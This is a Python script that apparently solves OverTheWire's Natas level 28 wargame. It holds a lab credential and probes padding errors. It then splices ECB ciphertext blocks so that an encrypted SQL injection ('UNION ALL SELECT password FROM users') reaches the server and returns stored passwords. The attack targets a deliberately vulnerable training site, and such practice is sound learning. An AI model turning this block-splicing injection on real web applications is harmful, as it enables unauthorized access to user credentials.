import sys
import requests as req
import base64 as b64
from urllib.parse import unquote, quote
import hashlib
import time

username = "natas28"
password = "skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4"
url = "http://%s.natas.labs.overthewire.org/" % username

s = req.session()
url_part = url + "search.php/?query="

def get(s):
	r = s.get(url, auth=(username, password))
	return r

def post(s, data):
	r = s.post(url, auth=(username, password), data=data)
	return r

def print_padding_errors():
	data = {"query": "natas29"}
	r = post(s, data)
	cypher = unquote(r.url)[len(url_part):]
	prev = ""
	for i in range(0, -len(cypher), -1):
		r = s.get(url_part + cypher[:i], auth=(username, password))
		#print(cypher)
		#print(b64.b64decode(cypher))
		data = {"query": cypher[:i]}
		if r.text != prev:
			print("[" + cypher[:i] + "]")
			print()
			print(r.text[r.text.find("Notice"):])
		prev = r.text

def print_blocks(c):
	i = len(c)
	j = 0
	print()
	while i:
		print(c[j:j + 32], end=" ")
		i -= 32
		j += 32
	print()

def print_len_queries(i, query):
	data = {"query": query}
	r = post(s, data)
	cypher = unquote(r.url)[len(url_part):]
	#print(cypher)
	hex_c = b64.b64decode(cypher).hex()
	if not i % 11:
		print()
	print("%2d %3d" % (i, len(hex_c)), end=" ")
	print_blocks(hex_c)

def get_data(query):
	data = {"query": query}
	r = post(s, data)
	cypher = unquote(r.url)[len(url_part):]
	return b64.b64decode(cypher).hex()
	

if __name__ == "__main__":
	"""
	query = ""
	for i in range(1, 50):
		query += "a"
		if i == 110:
			query += "'"
		print_len_queries(i, query)
	"""
	init = "a" * 9
	good = init + "a"
	evil = init + "' UNION ALL SELECT password FROM users; # -- "

	good_hex = get_data(good)
	evil_hex = get_data(evil)
	final_hex = good_hex[:32*3] + evil_hex[32*3:]

	final_url = url_part + quote(b64.b64encode(bytes.fromhex(final_hex)))
	print(final_url)
	r = s.get(final_url, auth=(username, password))
	print(r.text)
